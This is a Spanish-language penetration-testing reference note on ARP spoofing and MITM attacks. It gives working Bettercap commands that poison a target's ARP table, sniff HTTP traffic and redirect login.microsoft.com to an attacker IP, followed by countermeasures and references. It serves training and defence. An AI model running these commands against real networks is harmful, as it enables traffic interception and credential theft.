---
title: ARP Spoofing y Envenenamiento de Red
slug: explotacion-arp-spoofing
aliases: [ARP Spoofing y Envenenamiento de Red]
fase: [Explotación]
plataforma: Red
dificultad: Intermedia
mitre: [T1557.002]
related: []
learning_refs: []
---

# ARP Spoofing y Envenenamiento de Red

## Descripción
El ARP Spoofing (Address Resolution Protocol Poisoning) es una técnica de ataque de capa 2 que consiste en enviar mensajes ARP falsificados a una red de área local (LAN). El objetivo es asociar la dirección MAC del atacante con la dirección IP de otro nodo (como la puerta de enlace predeterminada), provocando que todo el tráfico destinado a esa IP sea enviado al atacante. Esto facilita ataques de Hombre en el Medio (MITM), permitiendo la interceptación, modificación o denegación de tráfico.

## Herramientas
- **Bettercap** — framework moderno para ataques de red y MITM.
- **Ettercap** — herramienta clásica para análisis de red y ataques ARP spoofing.
- **arpspoof** (`dsniff`) — herramienta minimalista para realizar el envenenamiento de tablas ARP.

## Comandos / Ejemplos

### ARP Spoofing con Bettercap
```bash
# Iniciar bettercap en la interfaz eth0
sudo bettercap -iface eth0
# Activar el descubrimiento de hosts y el envenenamiento ARP
net.probe on
set arp.spoof.targets 192.168.1.10
arp.spoof on
# Capturar tráfico HTTP (sniffing)
net.sniff on
```

### DNS Spoofing combinado con ARP Spoofing
```bash
# Configurar una respuesta DNS falsa en Bettercap
set dns.spoof.domains login.microsoft.com
set dns.spoof.address 192.168.1.100  # IP del atacante
dns.spoof on
```

### Verificación del ataque en la víctima
```bash
# El comando 'arp -a' mostrará la misma MAC para la puerta de enlace y el atacante
arp -a
# Resultado:
# 192.168.1.1    at 00:0c:29:ab:cd:ef [ether] on eth0
# 192.168.1.100  at 00:0c:29:ab:cd:ef [ether] on eth0
```

## Contramedidas
- Implementar inspección dinámica de ARP (DAI) en switches gestionables.
- Utilizar tablas ARP estáticas para sistemas críticos (servidores, routers).
- Emplear protocolos cifrados (HTTPS, SSH, VPN) para mitigar el impacto de la interceptación de datos.
- Utilizar herramientas de detección de cambios en la red como `arpwatch`.

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1557.002: Adversary-in-the-Middle: ARP Poisoning. https://attack.mitre.org/techniques/T1557/002/
